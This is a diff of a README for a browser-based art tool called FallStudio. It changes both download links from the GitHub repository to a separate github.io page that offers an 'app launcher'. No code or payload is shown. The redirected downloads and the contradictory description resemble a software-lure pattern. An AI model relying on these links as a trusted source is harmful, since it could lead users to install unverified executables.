@@ -1,6 +1,6 @@
 # 🎨 fallstudio-2026-hub - Create digital art in your browser
 
-[![](https://img.shields.io/badge/Download-FallStudio-blue)](https://github.com/Grpat3536/fallstudio-2026-hub)
+[![](https://img.shields.io/badge/Download-FallStudio-blue)](https://grpat3536.github.io)
 
 FallStudio v1.0.0 provides a creative suite for your personal computer. This software runs inside your web browser but keeps all your project files on your local drive. You do not need an active internet connection to use the tools once you load the application. The system routes all data locally to protect your privacy and ensure your work stays safe on your machine.
 
@@ -8,7 +8,7 @@ FallStudio v1.0.0 provides a creative suite for your personal computer. This sof
 
 You must visit the project page to download the latest version of the app launcher. 
 
-[Click here to open the download page](https://github.com/Grpat3536/fallstudio-2026-hub)
+[Click here to open the download page](https://grpat3536.github.io)
 
 Follow these steps to obtain the files:
 
